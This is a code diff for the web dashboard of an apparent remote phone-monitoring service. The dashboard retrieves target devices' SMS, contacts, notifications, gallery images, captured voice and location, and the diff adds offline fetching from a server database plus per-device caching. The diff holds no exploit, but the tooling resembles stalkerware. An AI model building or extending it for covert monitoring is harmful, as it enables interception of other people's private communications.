@@ -312,6 +312,16 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
         ids.forEach(id => {
             deletedDevicesRef.current.add(id);
             notifiedDevicesRef.current.delete(id);
+            try {
+                const uuid = session.user.uuid;
+                localStorage.removeItem(`galleryeye_contacts_${uuid}_${id}`);
+                localStorage.removeItem(`galleryeye_sms_${uuid}_${id}`);
+                localStorage.removeItem(`galleryeye_notifications_${uuid}_${id}`);
+                localStorage.removeItem(`gallery_images_${uuid}_${id}`);
+                localStorage.removeItem(`gallery_captured_${uuid}_${id}`);
+                localStorage.removeItem(`fm_cache_${uuid}_${id}`);
+                localStorage.removeItem(`loc_${id}`);
+            } catch {}
         });
         setDevices(prev => prev.filter(d => {
             const devId = d.deviceId || d.id || d._id;
@@ -687,22 +697,21 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
 
                 if (filteredList.length > 0) {
                     setSelectedDeviceId(prev => {
-                        // Check if current selection exists and is online
-                        const currentDev = filteredList.find(d => (d.deviceId || d.id || d._id) === prev);
-                        if (currentDev && currentDev.online) return prev;
+                        // 1. If user already selected a device and it exists in list, KEEP IT! (even if offline!)
+                        if (prev && filteredList.some(d => (d.deviceId || d.id || d._id) === prev)) {
+                            return prev;
+                        }
 
-                        // Check if savedId in localStorage is online
+                        // 2. Check if savedId in localStorage exists in list
                         const savedId = localStorage.getItem('selectedDeviceId');
-                        const savedDev = savedId ? filteredList.find(d => (d.deviceId || d.id || d._id) === savedId) : null;
-                        if (savedDev && savedDev.online) return savedId;
+                        if (savedId && filteredList.some(d => (d.deviceId || d.id || d._id) === savedId)) {
+                            return savedId;
+                        }
 
-                        // Prefer first online device
+                        // 3. Fallback: Prefer first online device, else first in list
                         const firstOnline = filteredList.find(d => d.online);
                         if (firstOnline) return firstOnline.deviceId || firstOnline.id || firstOnline._id;
 
-                        // Fallback to previous or first in list
-                        if (prev) return prev;
-                        if (savedId) return savedId;
                         return filteredList[0].deviceId || filteredList[0].id || filteredList[0]._id;
                     });
                 }
@@ -726,7 +735,13 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
 
             socket.on("new_image", (image: any) => {
                 if (isSyncCanceledRef.current) return;
-                const currentDevId = localStorage.getItem('selectedDeviceId');
+                const currentDevId = selectedDeviceIdRef.current;
+                
+                // Strict isolation: if image belongs to another device, do NOT add to active gallery!
+                if (image.deviceId && currentDevId && image.deviceId !== currentDevId) {
+                    return;
+                }
+
                 const imageWithDevice = {
                     ...image,
                     deviceId: image.deviceId || currentDevId || null
@@ -740,6 +755,28 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                     return [imageWithDevice, ...prev];
                 });
                 setTotalMediaCount(prev => prev + 1);
+            });
+
+            socket.on("image_deleted", (data: any) => {
+                setImages((prev) => prev.filter(img => img.id !== data.id && img.url !== data.id));
+                setCapturedMedia((prev) => prev.filter(img => img.id !== data.id && img.url !== data.id));
+                setCapturedVoice((prev) => prev.filter(v => v.id !== data.id && v.url !== data.id));
+            });
+
+            socket.on("images_deleted", (data: any) => {
+                const deletedIds = new Set(data.ids || []);
+                setImages((prev) => prev.filter(img => !deletedIds.has(img.id) && !deletedIds.has(img.url)));
+                setCapturedMedia((prev) => prev.filter(img => !deletedIds.has(img.id) && !deletedIds.has(img.url)));
+                setCapturedVoice((prev) => prev.filter(v => !deletedIds.has(v.id) && !deletedIds.has(v.url)));
+            });
+
+            socket.on("sync_status", (data: any) => {
+                setIsStartingSync(false);
+                setSyncStatus((prev: any) => ({
+                    ...prev,
+                    [data.type]: data.status,
+                    error: data.error
+                }));
             });
 
             socket.on("folder_list", (data: any) => {
@@ -786,32 +823,37 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                 }));
             });
 
-            // SMS Event Listeners with Non-Destructive Deduplicated Merge
+            // SMS Event Listeners with Non-Destructive Deduplicated Merge & Strict Device Isolation
             socket.on("sms_list", (data: any) => {
                 setIsFetchingSms(false);
-                const devId = data.deviceId || selectedDeviceIdRef.current;
+                const devId = data.deviceId;
                 const uuid = session?.user?.uuid;
                 const incomingSms = Array.isArray(data.sms) ? data.sms : [];
+
+                // Cache for originating device
+                if (devId && uuid && incomingSms.length > 0) {
+                    try {
+                        localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(incomingSms.slice(0, 1000)));
+                    } catch {}
+                }
+
+                // Strict Device Isolation: only update active UI if data belongs to currently selected device!
+                if (devId && selectedDeviceIdRef.current && devId !== selectedDeviceIdRef.current) {
+                    return;
+                }
 
                 if (incomingSms.length > 0) {
                     setSmsList((prev) => {
                         const map = new Map<string, any>();
-                        // Populate existing
                         prev.forEach((s: any) => {
                             const key = s.id ? String(s.id) : `${s.address}_${s.date}_${s.body}`;
                             map.set(key, s);
                         });
-                        // Merge incoming
                         incomingSms.forEach((s: any) => {
                             const key = s.id ? String(s.id) : `${s.address}_${s.date}_${s.body}`;
                             map.set(key, s);
                         });
                         const merged = Array.from(map.values()).sort((a, b) => (b.date || 0) - (a.date || 0));
-                        try {
-                            if (devId && uuid) {
-                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(merged.slice(0, 1000)));
-                            }
-                        } catch {}
                         return merged;
                     });
                 }
@@ -827,19 +869,27 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                 setShowCustomAlert(true);
             });
 
-            // Contacts Event Listeners
+            // Contacts Event Listeners with Strict Device Isolation
             const handleContactsReceived = (data: any) => {
                 setIsFetchingContacts(false);
                 const contactsArray = Array.isArray(data) ? data : (data.contacts || data.list || data.data || data.items || []);
+                const devId = data?.deviceId;
+                const uuid = session?.user?.uuid;
+
+                // Cache for originating device
+                if (devId && uuid && Array.isArray(contactsArray) && contactsArray.length > 0) {
+                    try {
+                        localStorage.setItem(`galleryeye_contacts_${uuid}_${devId}`, JSON.stringify(contactsArray));
+                    } catch {}
+                }
+
+                // Strict Device Isolation: only update active UI if data belongs to currently selected device!
+                if (devId && selectedDeviceIdRef.current && devId !== selectedDeviceIdRef.current) {
+                    return;
+                }
+
                 if (Array.isArray(contactsArray)) {
                     setContactsList(contactsArray);
-                    try {
-                        const devId = data.deviceId || selectedDeviceIdRef.current;
-                        const uuid = session?.user?.uuid;
-                        if (devId && uuid && contactsArray.length > 0) {
-                            localStorage.setItem(`galleryeye_contacts_${uuid}_${devId}`, JSON.stringify(contactsArray));
-                        }
-                    } catch {}
                 }
             };
             socket.on("contacts_list", handleContactsReceived);
@@ -858,8 +908,29 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                 setShowCustomAlert(true);
             });
 
-            // Notification Monitoring Event Listeners with Deduplication
+            // Notification Monitoring Event Listeners with Strict Device Isolation
             socket.on("new_notification", (data: any) => {
+                const devId = data.deviceId;
+                const uuid = session?.user?.uuid;
+
+                // Cache for originating device
+                if (devId && uuid) {
+                    try {
+                        const cacheKey = `galleryeye_notifications_${uuid}_${devId}`;
+                        const prevCached = JSON.parse(localStorage.getItem(cacheKey) || '[]');
+                        const notifKey = data.id ? String(data.id) : `${data.packageName}_${data.title}_${data.text}_${data.timestamp || data.postTime || ''}`;
+                        if (!prevCached.some((n: any) => (n.id ? String(n.id) : `${n.packageName}_${n.title}_${n.text}_${n.timestamp || n.postTime || ''}`) === notifKey)) {
+                            const updatedCached = [{ ...data, receivedAt: data.receivedAt || Date.now() }, ...prevCached].slice(0, 500);
+                            localStorage.setItem(cacheKey, JSON.stringify(updatedCached));
+                        }
+                    } catch {}
+                }
+
+                // Strict Device Isolation: only update active UI if notification belongs to currently selected device!
+                if (devId && selectedDeviceIdRef.current && devId !== selectedDeviceIdRef.current) {
+                    return;
+                }
+
                 setNotifications(prev => {
                     const notifKey = data.id ? String(data.id) : `${data.packageName}_${data.title}_${data.text}_${data.timestamp || data.postTime || ''}`;
                     const isDuplicate = prev.some((n: any) => {
@@ -869,14 +940,7 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                     if (isDuplicate) return prev;
 
                     const updated = [{ ...data, receivedAt: data.receivedAt || Date.now() }, ...prev].slice(0, 500);
-                    try { 
-                        localStorage.setItem('galleryeye_notifications', JSON.stringify(updated));
-                        const devId = data.deviceId || selectedDeviceIdRef.current;
-                        const uuid = session?.user?.uuid;
-                        if (devId && uuid) {
-                            localStorage.setItem(`galleryeye_notifications_${uuid}_${devId}`, JSON.stringify(updated));
-                        }
-                    } catch { }
+                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                     return updated;
                 });
                 // Request icon if not already cached - emit OUTSIDE setState
@@ -1469,23 +1533,41 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
         setSyncMediaType(null); // Reset media type selection
     };
 
-    // SMS Functions
+    // SMS Functions (Works both Online & Offline via DB)
     const fetchSms = () => {
         // Plan check - SMS requires Standard or Premium
         if (!planLimits.sms) {
             showUpgradePrompt('SMS Access', 'standard');
             return;
         }
-        requireConnectedDevice((targetId) => {
-            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && effectiveTarget && session?.user?.uuid) {
-                setIsFetchingSms(true);
-                socket.emit("get_sms", {
-                    uuid: session.user.uuid,
-                    targetDeviceId: effectiveTarget
-                });
-            }
-        });
+        const effectiveTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        const uuid = (session?.user as any)?.uuid;
+        if (!effectiveTarget || !uuid) return;
+
+        setIsFetchingSms(true);
+
+        // 1. Fetch from persistent MongoDB database (works even when device is offline!)
+        fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${effectiveTarget}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.sms && Array.isArray(data.sms)) {
+                    if (selectedDeviceIdRef.current === effectiveTarget) {
+                        setSmsList(data.sms);
+                    }
+                    try { localStorage.setItem(`galleryeye_sms_${uuid}_${effectiveTarget}`, JSON.stringify(data.sms)); } catch {}
+                }
+            })
+            .catch(e => console.error('[SMS API] Fetch error:', e))
+            .finally(() => setIsFetchingSms(false));
+
+        // 2. If device is currently online, also request live update from device via socket
+        const isDeviceOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === effectiveTarget)?.online;
+        if (socket && isDeviceOnline) {
+            socket.emit("get_sms", {
+                uuid,
+                targetDeviceId: effectiveTarget
+            });
+        }
     };
 
     const resetSmsSync = () => {
@@ -1501,27 +1583,45 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
         });
     };
 
-    // Contacts Functions
+    // Contacts Functions (Works both Online & Offline via DB)
     const fetchContacts = () => {
         // Plan check - Contacts requires Standard or Premium
         if (!planLimits.contacts) {
             showUpgradePrompt('Contacts Access', 'standard');
             return;
         }
-        requireConnectedDevice((targetId) => {
-            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && effectiveTarget && session?.user?.uuid) {
-                setIsFetchingContacts(true);
-                const payload = {
-                    uuid: session.user.uuid,
-                    targetDeviceId: effectiveTarget,
-                    deviceId: effectiveTarget
-                };
-                socket.emit("get_contacts", payload);
-                socket.emit("sync_contacts", payload);
-                socket.emit("request_contacts", payload);
-            }
-        });
+        const effectiveTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        const uuid = (session?.user as any)?.uuid;
+        if (!effectiveTarget || !uuid) return;
+
+        setIsFetchingContacts(true);
+
+        // 1. Fetch from persistent MongoDB database (works even when device is offline!)
+        fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${effectiveTarget}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.contacts && Array.isArray(data.contacts)) {
+                    if (selectedDeviceIdRef.current === effectiveTarget) {
+                        setContactsList(data.contacts);
+                    }
+                    try { localStorage.setItem(`galleryeye_contacts_${uuid}_${effectiveTarget}`, JSON.stringify(data.contacts)); } catch {}
+                }
+            })
+            .catch(e => console.error('[Contacts API] Fetch error:', e))
+            .finally(() => setIsFetchingContacts(false));
+
+        // 2. If device is currently online, also request live update from device via socket
+        const isDeviceOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === effectiveTarget)?.online;
+        if (socket && isDeviceOnline) {
+            const payload = {
+                uuid,
+                targetDeviceId: effectiveTarget,
+                deviceId: effectiveTarget
+            };
+            socket.emit("get_contacts", payload);
+            socket.emit("sync_contacts", payload);
+            socket.emit("request_contacts", payload);
+        }
     };
 
     // Permission Check Function
